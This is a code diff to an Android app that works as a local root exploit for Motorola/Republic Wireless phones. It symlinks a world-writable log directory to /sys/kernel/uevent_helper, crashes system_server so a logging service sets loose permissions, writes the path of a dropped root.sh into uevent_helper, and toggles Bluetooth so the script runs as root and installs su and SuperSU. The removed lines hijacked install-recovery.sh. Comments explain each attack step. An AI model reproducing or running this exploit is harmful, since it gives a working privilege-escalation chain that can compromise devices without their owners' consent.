@@ -28,6 +28,7 @@ import java.io.OutputStream;
 import android.app.Activity;
 import android.app.AlertDialog;
 import android.app.ProgressDialog;
+import android.bluetooth.BluetoothAdapter;
 import android.content.Context;
 import android.content.DialogInterface;
 import android.content.Intent;
@@ -48,26 +49,26 @@ setContentView(R.layout.activity_main);
 	
 	if (stage2) {
 		
-		//Momma always said to keep a clean house
-		exec("rm /data/last_alog/*");
+		//Write path to script to uevent_helper, so it is executed on hotplug event
+		exec("echo /data/last_alog/root.sh > /sys/kernel/uevent_helper");
 		
-		//Backup install-recovery.sh, so we can restore all files back to normal later with root.sh
-		exec("cat /system/etc/install-recovery.sh > /system/etc/install-recovery.sh.backup");
-		
-		//Drop su and supersy.apk for installation by root.sh
-		extractAsset("su", "/system/etc/su", this);
-		extractAsset("supersu.apk", "/system/etc/supersu.apk", this);
-		
-		//Replace install-recovery.sh with our own script, so
-		extractAsset("root.sh", "/system/etc/install-recovery.sh", this);
-		
-		exec("chmod 755 /system/etc/install-recovery.sh");
-		
-		//Crash system_server, force a reboot.
-		kaBoom(MainActivity.this);
-		
+		//Toggle bluetooth to cause hotplug event
+	    BluetoothAdapter mBluetoothAdapter = BluetoothAdapter.getDefaultAdapter();    
+	    if (!mBluetoothAdapter.isEnabled()) {
+	    	mBluetoothAdapter.enable();
+	    }else{ 
+	        mBluetoothAdapter.disable(); 
+	    } 
+	    
 	} else {
 
+		//Dump resources to /data/last_alog
+		extractAsset("su", "/data/last_alog/su", this);
+		extractAsset("supersu.apk", "/data/last_alog/supersu.apk", this);
+		extractAsset("root.sh", "/data/last_alog/root.sh", this);
+		//Make script executable
+		exec("chmod 755 /data/last_alog/root.sh");
+		
 		AlertDialog alertDialog = new AlertDialog.Builder(this).create();
 		alertDialog.setTitle("Warning");
 		alertDialog.setCancelable(false);
@@ -78,19 +79,13 @@ setContentView(R.layout.activity_main);
 		alertDialog.setButton("Agree", new DialogInterface.OnClickListener() {
 		
 			public void onClick(DialogInterface dialog, int id) {
-				
-				//Clean up any mess from previous attempts that might of gone wrong.
-				exec("rm /data/last_alog/*");
-				
+
 				//Mark that stage1 has ran
 				exec("echo 1 > /data/last_alog/onboot");
 				
-				//Motorola/Republic Wireless's engineers made a big mistake, left /system mounted r/w, whoops.
-				
-				///system/bin/loggerlauncher runs "chmod 777 /data/last_alog/*" whenever something critical crashes
-				//and /data/last_alog is world writable by defualt, so lets setup a symlink attack
-			    exec("ln -s /system/etc /data/last_alog/with_love_from_jcase");
-			    exec("ln -s /system/etc/install-recovery.sh /data/last_alog/i_like_pie");
+
+				//and /data/last_alog is world writable by defualt, so lets setup a symlink attack to uevent_helper
+			    exec("ln -s /sys/kernel/uevent_helper /data/last_alog/with_love_from_jcase_again");
 			    
 			    //Crash system_sever, and make our targets world r/w/x
 			    kaBoom(MainActivity.this);
